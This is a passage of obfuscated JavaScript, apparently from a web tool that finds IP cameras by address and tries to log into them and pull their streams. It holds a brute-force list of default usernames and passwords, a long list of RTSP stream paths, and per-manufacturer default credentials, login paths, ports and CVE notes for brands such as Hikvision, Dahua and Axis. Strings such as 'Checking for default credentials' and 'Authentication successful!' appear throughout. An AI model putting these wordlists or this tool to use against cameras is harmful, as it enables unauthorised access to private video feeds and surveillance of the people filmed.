0found:','media/video1','cam1','hikadmin','faceLandmark68Net','operator','{ip}?fields=','password123','</strong>\x20-\x20Authentication\x20failed','[extractCameraMetadata]\x20Stream\x20URL\x20from\x20dataset:','system','</strong>\x20-\x20Authentication\x20successful!','preventDefault','CVE-2020-25169:\x20Hard-coded\x20credentials','user.pin.mp2','select','[extractCameraMetadata]\x20Checking\x20for\x20open\x20ports','<i\x20class=\x22fas\x20fa-sync-alt\x22></i>\x20Camera\x20list\x20refreshed','/index.html','Fetching\x20ASN\x20info\x20using\x20proxy\x20from:\x20','trackID=1','h264/media.amp','00000','<i\x20class=\x22fas\x20fa-copy\x22></i>','/PSIA/Custom/SelfExt/userCheck','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-label\x22>Region:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-value\x22>','success','autoResolution','clientHeight','[generateAlternativeStreams]\x20Generating\x20HTTP\x20alternatives\x20for\x20RTSP\x20stream','pastebinEndpoint','vapix','console-time','H.265','<i\x20class=\x22fas\x20fa-exclamation-triangle\x22></i>\x20No\x20camera\x20selected','random','prevLeft','Calling\x20extractCameraMetadata\x20function\x20directly','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22error-message\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-exclamation-triangle\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20fetching\x20IP\x20information:\x20','credential-notes','openPorts','defaultCredentials','HTTP\x20alternative\x20for\x20RTSP\x20stream','profile1','HTTP','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-label\x22>Timezone:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22info-value\x22>','high','camera;\x20microphone;\x20fullscreen;\x20display-capture;\x20autoplay','CVE-2017-7921:\x20Authentication\x20bypass\x20in\x20older\x20firmware','h265','model','Subtracted\x201\x20point\x20for\x20camera\x20hosted\x20in\x20data\x20center','wbox123','play2.sdp','2-digit','qwerty','RTSP','offsetWidth','medium','join','viewCurrentWindow','1234567','scrollTop','<p>No\x20ASN\x20data\x20available</p>','[extractCameraMetadata]\x20Starting\x20metadata\x20extraction','Unknown','Operator\x20account','cameraCount','rtsp://','title','live/h264','video-player','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','username','ch2/0','SSH/Telnet\x20default','Invalid\x20IP\x20data\x20structure','credentialDatabase','Subtracted\x201\x20point\x20for\x20open\x20critical\x20port:\x20','toLocaleTimeString','manufacturer','substring','Camera\x20already\x20exists\x20in\x20the\x20list','6102288thCXTW','100%','mp4','\x20issues\x20found)','observe','advancedModeTime','Application\x20initialized\x20successfully','access_code','.progress-fill','stun:stun.l.google.com:19302','/doc/page/login.asp','Failed\x20to\x20initialize\x20application:','[extractCameraMetadata]\x20Using\x20port:\x20','/cgi-bin/luci','CVE-2019-12266:\x20Buffer\x20overflow','\x20default\x20credentials','contents','/live/ch01_0','Manufacturer\x20security\x20rating:','mpeg4/media.amp','[extractCameraMetadata]\x20Checking\x20for\x20default\x20credentials','match','asnInfoEndpoint','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22data-pair\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22data-label\x22>IP:</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22data-value\x22>','Final\x20security\x20rating:','ipcam.sdp','CVE-2019-11344:\x20Command\x20injection','push','123456'];_0x8b5f=function(){return _0x5323cc;};return _0x8b5f();}let globalState={'latitude':null,'longitude':null,'asn':null,'cameras':[],'activeWindows':[],'resizeObservers':{},'advancedMode':![],'rawData':{'ipInfo':{},'asnInfo':{},'metadata':{}},'consoleLog':[],'currentSelectedCamera':null,'autoResolution':!![],'manualResolution':_0x5d7fa7(0x275),'playerPreference':_0x5d7fa7(0x303),'credentialDatabase':{'usernames':['',_0x5d7fa7(0x1cd),'888888',_0x5d7fa7(0x329),_0x5d7fa7(0x2da),_0x5d7fa7(0x22f),_0x5d7fa7(0x1a0),_0x5d7fa7(0x214),'aiphone',_0x5d7fa7(0x2ac),_0x5d7fa7(0x3b1),_0x5d7fa7(0x454),_0x5d7fa7(0x2aa),_0x5d7fa7(0x31d),_0x5d7fa7(0x224),_0x5d7fa7(0x226)],'passwords':['','0000',_0x5d7fa7(0x34f),'1111',_0x5d7fa7(0x296),_0x5d7fa7(0x3c7),_0x5d7fa7(0x255),_0x5d7fa7(0x3d3),_0x5d7fa7(0x2fc),_0x5d7fa7(0x3a8),_0x5d7fa7(0x376),_0x5d7fa7(0x31c),_0x5d7fa7(0x1a7),_0x5d7fa7(0x2e9),_0x5d7fa7(0x311),'666666',_0x5d7fa7(0x467),_0x5d7fa7(0x2b6),'9999',_0x5d7fa7(0x2da),_0x5d7fa7(0x312),_0x5d7fa7(0x2a1),_0x5d7fa7(0x329),_0x5d7fa7(0x315),_0x5d7fa7(0x1a0),_0x5d7fa7(0x214),_0x5d7fa7(0x1db),'camera','Camera',_0x5d7fa7(0x488),_0x5d7fa7(0x3d6),'hikvision',_0x5d7fa7(0x33c),_0x5d7fa7(0x263),_0x5d7fa7(0x47d),'jvc',_0x5d7fa7(0x1f5),_0x5d7fa7(0x223),_0x5d7fa7(0x2ce),_0x5d7fa7(0x3ee),_0x5d7fa7(0x2ad),_0x5d7fa7(0x340),_0x5d7fa7(0x370),'qwerty123',_0x5d7fa7(0x429),_0x5d7fa7(0x3bc),_0x5d7fa7(0x454),'service',_0x5d7fa7(0x224),'support',_0x5d7fa7(0x343),_0x5d7fa7(0x1c7),_0x5d7fa7(0x408),_0x5d7fa7(0x49b),_0x5d7fa7(0x226),_0x5d7fa7(0x195),_0x5d7fa7(0x4a0),_0x5d7fa7(0x36d),_0x5d7fa7(0x3b7)]},'rtspPaths':[_0x5d7fa7(0x39d),_0x5d7fa7(0x2a2),_0x5d7fa7(0x1d8),_0x5d7fa7(0x293),'1','1.AMP','1/h264major','1/stream1','11','12',_0x5d7fa7(0x3d9),'1080p','1440p',_0x5d7fa7(0x320),'4K',_0x5d7fa7(0x1cc),_0x5d7fa7(0x2de),_0x5d7fa7(0x202),'CAM_ID.password.mp2',_0x5d7fa7(0x185),_0x5d7fa7(0x404),'HD',_0x5d7fa7(0x2d2),'LowResolutionVideo',_0x5d7fa7(0x40d),_0x5d7fa7(0x24f),_0x5d7fa7(0x328),_0x5d7fa7(0x495),_0x5d7fa7(0x17e),'Streaming/Channels/1','Streaming/Unicast/channels/101','StreamingSetting?version=1.0&action=getRTSPStream&ChannelID=1&ChannelName=Channel1',_0x5d7fa7(0x1f0),'VideoInput/1/mpeg4/1',_0x5d7fa7(0x393),_0x5d7fa7(0x147),_0x5d7fa7(0x1ea),_0x5d7fa7(0x491),'av2','avc',_0x5d7fa7(0x248),_0x5d7fa7(0x253),_0x5d7fa7(0x338),'axis-media/media.amp?videocodec=h264',_0x5d7fa7(0x407),'cam/realmonitor',_0x5d7fa7(0x1dd),'cam/realmonitor?channel=1&subtype=0',_0x5d7fa7(0x420),'cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif',_0x5d7fa7(0x3cc),_0x5d7fa7(0x2b0),_0x5d7fa7(0x29c),_0x5d7fa7(0x33b),'cam1/h264',_0x5d7fa7(0x28e),_0x5d7fa7(0x288),_0x5d7fa7(0x30f),_0x5d7fa7(0x26f),_0x5d7fa7(0x322),_0x5d7fa7(0x30a),_0x5d7fa7(0x241),_0x5d7fa7(0x146),_0x5d7fa7(0x3e2),_0x5d7fa7(0x18d),'ch01.264?','ch01.264?ptype=tcp',_0x5d7fa7(0x170),_0x5d7fa7(0x453),'ch3_0',_0x5d7fa7(0x26e),'ch1/0',_0x5d7fa7(0x383),_0x5d7fa7(0x2f7),_0x5d7fa7(0x31b),'ch0_0.h264',_0x5d7fa7(0x428),_0x5d7fa7(0x3c5),_0x5d7fa7(0x1cb),_0x5d7fa7(0x26d),'gnz_media/main',_0x5d7fa7(0x30e),_0x5d7fa7(0x417),_0x5d7fa7(0x2c4),_0x5d7fa7(0x34e),_0x5d7fa7(0x3ad),_0x5d7fa7(0x400),_0x5d7fa7(0x25f),_0x5d7fa7(0x49c),_0x5d7fa7(0x3eb),_0x5d7fa7(0x2be),_0x5d7fa7(0x28a),'img/video.asf',_0x5d7fa7(0x43d),_0x5d7fa7(0x292),_0x5d7fa7(0x3a5),'ipcam_h264.sdp',_0x5d7fa7(0x27e),_0x5d7fa7(0x1dc),_0x5d7fa7(0x456),_0x5d7fa7(0x25e),'live/ch0',_0x5d7fa7(0x2eb),'live/ch01_0',_0x5d7fa7(0x37f),_0x5d7fa7(0x139),_0x5d7fa7(0x2b9),_0x5d7fa7(0x2ca),_0x5d7fa7(0x2d3),_0x5d7fa7(0x4a3),_0x5d7fa7(0x40a),_0x5d7fa7(0x3be),_0x5d7fa7(0x403),_0x5d7fa7(0x49d),_0x5d7fa7(0x29d),_0x5d7fa7(0x2e3),'media.amp?streamprofile=Profile1',_0x5d7fa7(0x23b),_0x5d7fa7(0x33a),_0x5d7fa7(0x249),_0x5d7fa7(0x424),_0x5d7fa7(0x38e),'mpeg/media.amp',_0x5d7fa7(0x15f),_0x5d7fa7(0x41f),_0x5d7fa7(0x39f),_0x5d7fa7(0x193),_0x5d7fa7(0x492),'mpg4/rtsp.amp',_0x5d7fa7(0x2ed),_0x5d7fa7(0x159),_0x5d7fa7(0x3ae),_0x5d7fa7(0x2a6),_0x5d7fa7(0x2bb),'nphMpeg4/g726-640x480','nphMpeg4/nil-320x240',_0x5d7fa7(0x153),'onvif1','pass@10.0.0.5:6667/blinkhd',_0x5d7fa7(0x436),_0x5d7fa7(0x36e),_0x5d7fa7(0x3ca),_0x5d7fa7(0x364),_0x5d7fa7(0x212),_0x5d7fa7(0x235),_0x5d7fa7(0x1cf),_0x5d7fa7(0x152),_0x5d7fa7(0x137),_0x5d7fa7(0x180),_0x5d7fa7(0x1d5),'rtsp_tunnel','rtsph264','rtsph2641080p','snap.jpg',_0x5d7fa7(0x2f8),'stream/0',_0x5d7fa7(0x17b),'stream/live.sdp',_0x5d7fa7(0x184),_0x5d7fa7(0x133),_0x5d7fa7(0x13a),_0x5d7fa7(0x262),_0x5d7fa7(0x310),_0x5d7fa7(0x18f),_0x5d7fa7(0x422),_0x5d7fa7(0x1e2),_0x5d7fa7(0x34d),'ucast/11',_0x5d7fa7(0x251),_0x5d7fa7(0x1ff),_0x5d7fa7(0x20a),_0x5d7fa7(0x347),_0x5d7fa7(0x207),_0x5d7fa7(0x438),'user=admin_password=?????_channel=1_stream=0.sdp?real_stream','user=admin_password=R5XFY888_channel=1_stream=0.sdp?real_stream',_0x5d7fa7(0x142),'v2','video',_0x5d7fa7(0x17c),_0x5d7fa7(0x29f),_0x5d7fa7(0x2a4),_0x5d7fa7(0x1f9),_0x5d7fa7(0x2d6),'video.pro2','video.pro3',_0x5d7fa7(0x4a1),_0x5d7fa7(0x3b8),_0x5d7fa7(0x163),'video1.sdp','video1+audio1',_0x5d7fa7(0x26a),'videoinput_1/h264_1/media.stm',_0x5d7fa7(0x475),_0x5d7fa7(0x260),_0x5d7fa7(0x2fb)],'cameraModels':{'hikvision':{'patterns':[_0x5d7fa7(0x48e),_0x5d7fa7(0x498),_0x5d7fa7(0x48a),_0x5d7fa7(0x23d),_0x5d7fa7(0x421)],'defaultCredentials':[{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2fc),'notes':_0x5d7fa7(0x448)},{'username':'admin','password':_0x5d7fa7(0x2da),'notes':'Common\x20default'},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2bc),'notes':_0x5d7fa7(0x45a)},{'username':_0x5d7fa7(0x2da),'password':'','notes':_0x5d7fa7(0x483)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x3a8),'notes':_0x5d7fa7(0x14a)},{'username':'admin','password':_0x5d7fa7(0x48e),'notes':_0x5d7fa7(0x337)},{'username':_0x5d7fa7(0x33e),'password':_0x5d7fa7(0x33e),'notes':_0x5d7fa7(0x283)}],'webPaths':[_0x5d7fa7(0x396),_0x5d7fa7(0x351),_0x5d7fa7(0x162)],'ports':[0x50,0x1bb,0x22a,0x1f40,0x2008],'securityRating':_0x5d7fa7(0x373),'vulnerabilities':[_0x5d7fa7(0x15c),_0x5d7fa7(0x369)]},'dahua':{'patterns':['dahua','dh-','ipc-h',_0x5d7fa7(0x3fe),'lechange'],'defaultCredentials':[{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2da),'notes':_0x5d7fa7(0x448)},{'username':'admin','password':'Admin123','notes':_0x5d7fa7(0x499)},{'username':'admin','password':_0x5d7fa7(0x2ad),'notes':_0x5d7fa7(0x14a)},{'username':'888888','password':'888888','notes':'Secondary\x20admin\x20account'},{'username':_0x5d7fa7(0x1cd),'password':_0x5d7fa7(0x1cd),'notes':_0x5d7fa7(0x37b)},{'username':'default','password':_0x5d7fa7(0x3c4),'notes':_0x5d7fa7(0x450)},{'username':_0x5d7fa7(0x454),'password':_0x5d7fa7(0x44e),'notes':_0x5d7fa7(0x1c5)}],'webPaths':[_0x5d7fa7(0x412),_0x5d7fa7(0x281),_0x5d7fa7(0x24d)],'ports':[0x50,0x1bb,0x22a,0x9391],'securityRating':_0x5d7fa7(0x373),'vulnerabilities':['CVE-2021-33044:\x20Authentication\x20bypass\x20in\x20some\x20models',_0x5d7fa7(0x1ae)]},'axis':{'patterns':[_0x5d7fa7(0x13f),_0x5d7fa7(0x413),_0x5d7fa7(0x358)],'defaultCredentials':[{'username':'root','password':_0x5d7fa7(0x2ce),'notes':_0x5d7fa7(0x448)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2da),'notes':_0x5d7fa7(0x443)},{'username':'root','password':_0x5d7fa7(0x454),'notes':_0x5d7fa7(0x461)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2b7),'notes':_0x5d7fa7(0x1fc)},{'username':_0x5d7fa7(0x31f),'password':'viewer','notes':_0x5d7fa7(0x2c1)}],'webPaths':[_0x5d7fa7(0x2ff),_0x5d7fa7(0x274),'/axis-cgi/jpg/image.cgi'],'ports':[0x50,0x1bb,0x22a],'securityRating':_0x5d7fa7(0x367),'vulnerabilities':[_0x5d7fa7(0x1d7)]},'foscam':{'patterns':[_0x5d7fa7(0x240),'fi9','r2','c1','c2'],'defaultCredentials':[{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2da),'notes':_0x5d7fa7(0x448)},{'username':'admin','password':'','notes':'Blank\x20password\x20on\x20some\x20models'},{'username':_0x5d7fa7(0x2da),'password':'password','notes':'Common\x20variation'},{'username':'admin','password':_0x5d7fa7(0x240),'notes':'Brand\x20name\x20as\x20password'},{'username':_0x5d7fa7(0x181),'password':'visitor','notes':_0x5d7fa7(0x169)}],'webPaths':[_0x5d7fa7(0x336),_0x5d7fa7(0x2e6),_0x5d7fa7(0x1c1)],'ports':[0x50,0x1bb,0x22a,0x58,0x2760],'securityRating':_0x5d7fa7(0x20b),'vulnerabilities':[_0x5d7fa7(0x1b7),_0x5d7fa7(0x168),_0x5d7fa7(0x3ff)]},'tplink':{'patterns':[_0x5d7fa7(0x3ab),_0x5d7fa7(0x49b),_0x5d7fa7(0x198)],'defaultCredentials':[{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2da),'notes':'Factory\x20default'},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2ad),'notes':_0x5d7fa7(0x14a)},{'username':'admin','password':'tp-link','notes':_0x5d7fa7(0x337)},{'username':'admin','password':_0x5d7fa7(0x3ab),'notes':_0x5d7fa7(0x42c)}],'webPaths':[_0x5d7fa7(0x15e),_0x5d7fa7(0x138),_0x5d7fa7(0x399)],'ports':[0x50,0x1bb,0x22a,0x7e4],'securityRating':_0x5d7fa7(0x373),'vulnerabilities':['CVE-2020-35575:\x20Remote\x20code\x20execution\x20in\x20Tapo\x20cameras',_0x5d7fa7(0x258)]},'wyze':{'patterns':[_0x5d7fa7(0x2ea),_0x5d7fa7(0x190)],'defaultCredentials':[{'username':'admin','password':_0x5d7fa7(0x315),'notes':_0x5d7fa7(0x448)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x3fd),'notes':'Common\x20variation'}],'webPaths':[_0x5d7fa7(0x3e8),_0x5d7fa7(0x205)],'ports':[0x50,0x1bb,0x22a],'securityRating':_0x5d7fa7(0x373),'vulnerabilities':['CVE-2019-9569:\x20Information\x20disclosure',_0x5d7fa7(0x39a)]},'reolink':{'patterns':['reolink','rlc-'],'defaultCredentials':[{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2da),'notes':_0x5d7fa7(0x448)},{'username':_0x5d7fa7(0x2da),'password':'','notes':_0x5d7fa7(0x483)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x3bc),'notes':_0x5d7fa7(0x337)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x1f4),'notes':'Updated\x20default\x20on\x20newer\x20models'},{'username':_0x5d7fa7(0x2cc),'password':_0x5d7fa7(0x2cc),'notes':_0x5d7fa7(0x169)}],'webPaths':[_0x5d7fa7(0x3e8),_0x5d7fa7(0x171),_0x5d7fa7(0x2ee)],'ports':[0x50,0x1bb,0x22a,0x2328],'securityRating':_0x5d7fa7(0x373),'vulnerabilities':[_0x5d7fa7(0x346),'CVE-2020-25173:\x20Command\x20injection']},'amcrest':{'patterns':['amcrest',_0x5d7fa7(0x4a4)],'defaultCredentials':[{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2da),'notes':_0x5d7fa7(0x448)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2ad),'notes':_0x5d7fa7(0x14a)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2a0),'notes':_0x5d7fa7(0x337)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x315),'notes':'Common\x20variation'}],'webPaths':[_0x5d7fa7(0x334),_0x5d7fa7(0x24d)],'ports':[0x50,0x1bb,0x22a],'securityRating':'medium','vulnerabilities':[_0x5d7fa7(0x2f6),_0x5d7fa7(0x465)]},'ubiquiti':{'patterns':[_0x5d7fa7(0x2c7),_0x5d7fa7(0x466),_0x5d7fa7(0x1b1),_0x5d7fa7(0x2f0)],'defaultCredentials':[{'username':_0x5d7fa7(0x226),'password':'ubnt','notes':'Factory\x20default'},{'username':_0x5d7fa7(0x2da),'password':'admin','notes':_0x5d7fa7(0x461)},{'username':'root','password':_0x5d7fa7(0x226),'notes':_0x5d7fa7(0x384)}],'webPaths':['/api/2.0/login',_0x5d7fa7(0x160),_0x5d7fa7(0x3cb)],'ports':[0x50,0x1bb,0x22a,0x1ba8,0x1d13],'securityRating':_0x5d7fa7(0x373),'vulnerabilities':['CVE-2021-22909:\x20Improper\x20access\x20control',_0x5d7fa7(0x3a6)]},'vivotek':{'patterns':['vivotek',_0x5d7fa7(0x18c)],'defaultCredentials':[{'username':_0x5d7fa7(0x454),'password':_0x5d7fa7(0x454),'notes':_0x5d7fa7(0x448)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2da),'notes':_0x5d7fa7(0x443)},{'username':_0x5d7fa7(0x140),'password':_0x5d7fa7(0x140),'notes':'Brand\x20name\x20credentials'}],'webPaths':[_0x5d7fa7(0x2e6),_0x5d7fa7(0x25d)],'ports':[0x50,0x1bb,0x22a,0xe76],'securityRating':_0x5d7fa7(0x373),'vulnerabilities':[_0x5d7fa7(0x3b4),_0x5d7fa7(0x2a8)]},'generic':{'patterns':[_0x5d7fa7(0x406),_0x5d7fa7(0x437),_0x5d7fa7(0x1e3),_0x5d7fa7(0x47f),_0x5d7fa7(0x144)],'defaultCredentials':[{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2da),'notes':_0x5d7fa7(0x25a)},{'username':_0x5d7fa7(0x2da),'password':_0x5d7fa7(0x2ad),'notes':'Very\x20common\x20default'},{'username':'admin','password':'1234','notes':_0x5d7fa7(0x2b5)},{'username':_0x5d7fa7(0x2da),'password':'12345','notes':'Simple\x20numeric\x20password'},{'username':_0x5d7fa7(0x2da),'password':'','notes':'Blank\x20password'},{'username':_0x5d7fa7(0x454),'password':_0x5d7fa7(0x454),'notes':_0x5d7fa7(0x1e1)},{'username':_0x5d7fa7(0x195),'password':_0x5d7fa7(0x195),'notes':_0x5d7fa7(0x3f8)},{'username':_0x5d7fa7(0x2cc),'password':_0x5d7fa7(0x2cc),'notes':_0x5d7fa7(0x169)}],'webPaths':[_0x5d7fa7(0x34b),_0x5d7fa7(0x225),_0x5d7fa7(0x334)],'ports':[0x50,0x1bb,0x22a,0x1f90,0x1f40],'securityRating':_0x5d7fa7(0x20b),'vulnerabilities':[_0x5d7fa7(0x14e),_0x5d7fa7(0x1b2),_0x5d7fa7(0x20e)]}}};const DOM={'elements':{},'init'(){const _0x599ced=_0x5d7fa7,_0x526eed={'cameraList':_0x599ced(0x3d2),'addIpForm':_0x599ced(0x285),'addIpInput':_0x599ced(0x2f5),'addIpButton':_0x599ced(0x1bf),'sidebar':_0x599ced(0x1a9),'clock':_0x599ced(0x45e),'cameraCount':_0x599ced(0x37c),'advancedModeButton':_0x599ced(0x26c)};for(const [_0x534ff0,_0x5f48c1]of Object[_0x599ced(0x479)](_0x526eed)){const _0x79cbab=document['getElementById'](_0x5f48c1);!_0x79cbab&&console[_0x599ced(0x161)](_0x599ced(0x1bb)+_0x5f48c1+_0x599ced(0x22d)),this[_0x599ced(0x3ba)][_0x534ff0]=_0x79cbab;}return this;},'get'(_0x3488f6){const _0x1e4e00=_0x5d7fa7,_0x1959b6=this[_0x1e4e00(0x3ba)][_0x3488f6];return!_0x1959b6&&console[_0x1e4e00(0x161)]('Element\x20\x27'+_0x3488f6+_0x1e4e00(0x2a3)),_0x1959b6;}},originalConsole={'log':console[_0x5d7fa7(0x401)],'error':console['error'],'warn':console['warn'],'info':console[_0x5d7fa7(0x15d)]};console['log']=function(){const _0x145b39=_0x5d7fa7,_0x4ab317=Array['from'](arguments);globalState[_0x145b39(0x306)][_0x145b39(0x3a7)]({'type':_0x145b39(0x401),'time':new Date(),'message':_0x4ab317[_0x145b39(0x3d5)](_0xbd6a6c=>typeof _0xbd6a6c==='object'?JSON[_0x145b39(0x1a8)](_0xbd6a6c):_0xbd6a6c)[_0x145b39(0x374)]('\x20')}),updateConsoleOutput(),originalConsole[_0x145b39(0x401)][_0x145b39(0x447)](console,arguments);},console['error']=function(){const _0x476e54=_0x5d7fa7,_0x2be600=Array[_0x476e54(0x290)](arguments);globalState[_0x476e54(0x306)]['push']({'type':'error','time':new Date(),'message':_0x2be600[_0x476e54(0x3d5)](_0x3bfc93=>typeof _0x3bfc93===_0x476e54(0x411)?JSON['stringify'](_0x3bfc93):_0x3bfc93)['join']('\x20')}),updateConsoleOutput(),originalConsole[_0x476e54(0x473)][_0x476e54(0x447)](console,arguments);},console[_0x5d7fa7(0x161)]=function(){const _0x142670=_0x5d7fa7,_0x42d680=Array[_0x142670(0x290)](arguments);globalState[_0x142670(0x306)]['push']({'type':_0x142670(0x161),'time':new Date(),'message':_0x42d680[_0x142670(0x3d5)](_0x5f1f01=>typeof _0x5f1f01===_0x142670(0x411)?JSON[_0x142670(0x1a8)](_0x5f1f01):_0x5f1f01)[_0x142670(0x374)]('\x20')}),updateConsoleOutput(),originalConsole[_0x142670(0x161)][_0x142670(0x447)](console,arguments);},console[_0x5d7fa7(0x15d)]=function(){const _0xb07204=_0x5d7fa7,_0x51361a=Array[_0xb07204(0x290)](arguments);globalState[_0xb07204(0x306)]['push']({'type':_0xb07204(0x15d),'time':new Date(),'message':_0x51361a[_0xb07204(0x3d5)](_0x24c0ab=>typeof _0x24c0ab===_0xb07204(0x411)?JSON[_0xb07204(0x1a8)](_0x24c0ab):_0x24c0ab)[_0xb07204(0x374)]('\x20')}),updateConsoleOutput(),originalConsole[_0xb07204(0x15d)][_0xb07204(0x447)](console,arguments);};const extractIpFromUrl=_0x498ce0=>{const _0x27a506=_0x5d7fa7,_0x152b45=_0x498ce0[_0x27a506(0x3a1)](/(\d+\.\d+\.\d+\.\d+)/);return _0x152b45?_0x152b45[0x0]:null;},createElementWithClass=(_0x395e2b,_0x51c2f8)=>{const _0x12c34d=_0x5d7fa7,_0x115161=document[_0x12c34d(0x21c)](_0x395e2b);if(_0x51c2f8)_0x115161[_0x12c34d(0x259)]=_0x51c2f8;return _0x115161;},createElementWithHTML=(_0x42f1ec,_0x28d615,_0x5d8506)=>{const _0x5a585d=_0x5d7fa7,_0x25e0b8=document[_0x5a585d(0x21c)](_0x42f1ec);if(_0x5d8506)_0x25e0b8[_0x5a585d(0x259)]=_0x5d8506;return _0x25e0b8[_0x5a585d(0x2af)]=_0x28d615,_0x25e0b8;};async function fetchJson(_0x2e58f6){const _0xfda91b=_0x5d7fa7;try{console[_0xfda91b(0x401)](_0xfda91b(0x304)+_0x2e58f6);const _0xf70cf5=new AbortController(),_0x472ed0=setTimeout(()=>_0xf70cf5[_0xfda91b(0x149)](),0x2710),_0x49f214=await fetch(_0x2e58f6,{'signal':_0xf70cf5[_0xfda91b(0x455)]});clearTimeout(_0x472ed0);if(!_0x49f214['ok']){const _0x3d5c42=await _0x49f214[_0xfda91b(0x143)]();throw new Error(_0xfda91b(0x2e0)+_0x49f214['status']+_0xfda91b(0x254)+_0x3d5c42);}const _0x763afb=await _0x49f214[_0xfda91b(0x187)]();if(!_0x763afb)throw new Error(_0xfda91b(0x16a));return _0x763afb;}catch(_0x15a558){if(_0x15a558['name']===_0xfda91b(0x18b))throw new Error(_0xfda91b(0x44d));console[_0xfda91b(0x473)](_0xfda91b(0x27a),_0x15a558);throw _0x15a558;}}const updateCameraCount=()=>{const _0x44d6a9=_0x5d7fa7,_0xb357c0=globalState[_0x44d6a9(0x2b4)][_0x44d6a9(0x326)];DOM['get'](_0x44d6a9(0x37c))[_0x44d6a9(0x43f)]=_0xb357c0+'\x20camera'+(_0xb357c0!==0x1?'s':'');},updateClock=()=>{const _0x593e9f=_0x5d7fa7,_0x7282e9=new Date();DOM[_0x593e9f(0x165)](_0x593e9f(0x45e))[_0x593e9f(0x43f)]=_0x7282e9['toLocaleTimeString']([],{'hour':_0x593e9f(0x36f),'minute':'2-digit','second':'2-digit'});},removeOverlay=()=>{const _0x33da48=_0x5d7fa7,_0x1349ab=document['getElementById'](_0x33da48(0x282));_0x1349ab&&(_0x1349ab['remove'](),console[_0x33da48(0x401)](_0x33da48(0x44a)));},makeDraggable=(_0x3eba67,_0x3470f3)=>{const _0x3b3a79=_0x5d7fa7;let _0x2dd205=0x0,_0x4e9d06=0x0,_0x27fd71=0x0,_0x4fa3ae=0x0,_0x1540f2=![];if(!_0x3470f3||!_0x3eba67)return;_0x3470f3[_0x3b3a79(0x15a)]=_0x20f2b7;function _0x20f2b7(_0x5d2690){const _0x1545be=_0x3b3a79;if(_0x5d2690[_0x1545be(0x2ba)]['closest']('button'))return;_0x5d2690=_0x5d2690||window[_0x1545be(0x2fa)],_0x5d2690['preventDefault']();const _0x4a9394=Math[_0x1545be(0x40e)](...Array['from'](document[_0x1545be(0x416)](_0x1545be(0x2c3)))[_0x1545be(0x3d5)](_0x2e6fe8=>parseInt(getComputedStyle(_0x2e6fe8)[_0x1545be(0x13e)])||0x0));_0x3eba67[_0x1545be(0x270)][_0x1545be(0x13e)]=_0x4a9394+0x1,_0x27fd71=_0x5d2690[_0x1545be(0x3bb)],_0x4fa3ae=_0x5d2690['clientY'],document[_0x1545be(0x308)]=_0x3f53e4,document[_0x1545be(0x496)]=_0x25b18b,_0x1540f2=!![],_0x3eba67['classList'][_0x1545be(0x3dc)]('dragging');}function _0x25b18b(_0xeea590){const 